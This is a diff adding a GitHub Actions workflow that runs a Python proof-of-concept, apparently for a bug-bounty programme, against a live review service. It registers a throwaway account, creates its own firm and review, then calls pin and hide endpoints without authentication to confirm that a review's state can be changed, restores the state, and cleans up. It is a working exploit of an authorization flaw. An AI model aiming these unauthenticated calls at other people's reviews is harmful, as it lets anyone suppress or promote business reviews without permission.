@@ -1,0 +1,93 @@
+name: MyReviews unauth review mutation
+on:
+  push:
+    branches: [bb/mr-review-auth-20260815]
+    paths: ['.github/workflows/mr-review-unauth-mutation.yml']
+permissions: {}
+jobs:
+  proof:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: Test pin/hide without JWT using one researcher-owned demo firm and review
+        run: |
+          set -euo pipefail
+          python3 - <<'PY'
+          import hashlib,json,random,string,time,urllib.error,urllib.parse,urllib.request
+          BASE='https://myreviews.dev/v1';UA='Mozilla/5.0 Standoff365-MyReviews-review-mutation-dimion4231'
+          def R(m,p,t=None,j=None,f=None,cap=450000):
+              h={'User-Agent':UA,'Accept':'application/json,*/*'};d=None
+              if t:h['Authorization']='Bearer '+t
+              if j is not None:h['Content-Type']='application/json';d=json.dumps(j,ensure_ascii=False).encode()
+              elif f is not None:h['Content-Type']='application/x-www-form-urlencoded';d=urllib.parse.urlencode(f,doseq=True).encode()
+              try:
+                  with urllib.request.urlopen(urllib.request.Request(BASE+p,headers=h,data=d,method=m),timeout=25) as r:return r.status,r.read(cap)
+              except urllib.error.HTTPError as e:return e.code,e.read(cap)
+              except Exception as e:print('TRANSPORT',m,p,type(e).__name__);return None,b''
+          def J(b):
+              try:return json.loads(b.decode('utf-8','replace'))
+              except:return None
+          def L(lbl,s,b):
+              o=J(b);print(lbl,'status',s,'message',str(o.get('message',''))[:180] if isinstance(o,dict) else '','keys',sorted(o.keys()) if isinstance(o,dict) else []);return o
+          H=lambda x:hashlib.sha256(str(x).encode()).hexdigest()[:12]
+          def rows(o):
+              if isinstance(o,list):return o
+              if isinstance(o,dict):
+                  d=o.get('data')
+                  if isinstance(d,list):return d
+                  if isinstance(d,dict):
+                      for k in ('items','reviews','data'):
+                          if isinstance(d.get(k),list):return d[k]
+              return []
+          def flags(obj):
+              out={}
+              if not isinstance(obj,dict):return out
+              for k,v in obj.items():
+                  lk=k.lower()
+                  if any(x in lk for x in ('pin','hidden','hide','visible','show','status','delete')) and isinstance(v,(bool,int,str,type(None))):out[k]=v
+              return out
+          rnd=''.join(random.choice(string.ascii_lowercase+string.digits) for _ in range(9));pw='Standoff!'+''.join(random.choice(string.ascii_letters+string.digits) for _ in range(20));email=f'dimin4241+review-{rnd}@gmail.com';phone='+700'+''.join(random.choice(string.digits) for _ in range(8));reg={'email':email,'password':pw,'password_confirm':pw,'surname':'Standoff','name':'ReviewProof','phone':phone}
+          s,b=R('POST','/user/join-by-email',j={'RegistrationForm':reg});L('REGISTER',s,b);time.sleep(1.1);s,b=R('POST','/user/login',j={'LoginForm':{'email':email,'password':pw}});lo=L('LOGIN',s,b);jwt=((lo or {}).get('data') or {}).get('jwt') if isinstance((lo or {}).get('data'),dict) else None
+          if not jwt:raise SystemExit(0)
+          # Enable the official demo only as a controlled test fixture.
+          time.sleep(1.1);s,b=R('POST','/plan/start-demo',t=jwt,j={});L('START_DEMO',s,b)
+          firm_name='STANDOFF-REVIEW-'+rnd;time.sleep(1.1);s,b=R('POST','/firm/create',t=jwt,j={'Firm':{'name':firm_name,'address':'Standoff controlled'}});fo=L('CREATE_FIRM',s,b);fid=(fo or {}).get('id') if isinstance(fo,dict) else None
+          if not fid:raise SystemExit(0)
+          fid=str(fid);time.sleep(1.1);s,b=R('GET','/firm/list?per-page=30',t=jwt);fl=L('FIRM_LIST',s,b);fr=next((x for x in rows(fl) if isinstance(x,dict) and str(x.get('id'))==fid),None);print('FIRM_ACTIVE',fr.get('active') if isinstance(fr,dict) else None,'firm_hash',H(fid))
+          marker='STANDOFF review mutation '+rnd
+          time.sleep(1.1);s,b=R('POST','/review/create?firm_id='+urllib.parse.quote(fid),f={'Review[message]':marker,'Review[rating]':'5','Review[username]':'Standoff Fixture'});L('CREATE_OWN_REVIEW',s,b)
+          if s!=200:
+              time.sleep(1);R('GET','/firm/delete?id='+urllib.parse.quote(fid),t=jwt);raise SystemExit(0)
+          def get_review(label):
+              time.sleep(1.1);s,b=R('GET','/review/index?ReviewSearch[firm_id]='+urllib.parse.quote(fid)+'&page=1&per-page=50&ReviewSearch[servicesRaw]=',t=jwt);o=L(label,s,b);found=None
+              for x in rows(o):
+                  if isinstance(x,dict) and x.get('message')==marker:found=x;break
+              if found is None:
+                  # fallback structural search in response objects
+                  for x in rows(o):
+                      if isinstance(x,dict) and marker in json.dumps(x,ensure_ascii=False):found=x;break
+              print(label+'_FOUND',found is not None,'id_hash',H(found.get('id')) if isinstance(found,dict) and found.get('id') is not None else '','flags',flags(found))
+              return found
+          before=get_review('OWNER_REVIEW_BEFORE')
+          if not isinstance(before,dict) or before.get('id') is None:
+              R('GET','/firm/delete?id='+urllib.parse.quote(fid),t=jwt);raise SystemExit(0)
+          rid=str(before.get('id'))
+          # NO JWT on the two suspected mutation endpoints.
+          time.sleep(1.2);ps,pb=R('GET','/review/pin-switch?id='+urllib.parse.quote(rid));po=L('UNAUTH_PIN_SWITCH',ps,pb);after_pin=get_review('OWNER_REVIEW_AFTER_UNAUTH_PIN')
+          pin_changed=(flags(before)!=flags(after_pin)) if isinstance(after_pin,dict) else False
+          print('PIN_FLAGS_CHANGED',pin_changed,'before',flags(before),'after',flags(after_pin))
+          # Restore pin with same unauth endpoint only if it changed, keeping fixture neutral.
+          if pin_changed:
+              time.sleep(1.1);rs,rb=R('GET','/review/pin-switch?id='+urllib.parse.quote(rid));L('UNAUTH_PIN_RESTORE',rs,rb);restored_pin=get_review('OWNER_REVIEW_AFTER_PIN_RESTORE');print('PIN_RESTORED',flags(restored_pin)==flags(before) if isinstance(restored_pin,dict) else False)
+          current=get_review('OWNER_REVIEW_BEFORE_HIDE')
+          time.sleep(1.2);hs,hb=R('GET','/review/hidden-switch?id='+urllib.parse.quote(rid));ho=L('UNAUTH_HIDDEN_SWITCH',hs,hb);after_hide=get_review('OWNER_REVIEW_AFTER_UNAUTH_HIDE')
+          hide_changed=(flags(current)!=flags(after_hide)) if isinstance(current,dict) and isinstance(after_hide,dict) else False
+          print('HIDE_FLAGS_CHANGED',hide_changed,'before',flags(current),'after',flags(after_hide))
+          if hide_changed:
+              time.sleep(1.1);rrs,rrb=R('GET','/review/hidden-switch?id='+urllib.parse.quote(rid));L('UNAUTH_HIDE_RESTORE',rrs,rrb);restored=get_review('OWNER_REVIEW_AFTER_HIDE_RESTORE');print('HIDE_RESTORED',flags(restored)==flags(current) if isinstance(restored,dict) else False)
+          # Cleanup only own firm; it owns the synthetic review.
+          time.sleep(1.1);ds,db=R('GET','/firm/delete?id='+urllib.parse.quote(fid),t=jwt);L('CLEANUP_FIRM',ds,db)
+          if ps==200 and pin_changed:print('CONFIRMED_UNAUTHENTICATED_REVIEW_PIN_MUTATION')
+          if hs==200 and hide_changed:print('CONFIRMED_UNAUTHENTICATED_REVIEW_VISIBILITY_MUTATION')
+          if not ((ps==200 and pin_changed) or (hs==200 and hide_changed)):print('UNAUTH_REVIEW_MUTATION_NOT_CONFIRMED')
+          PY
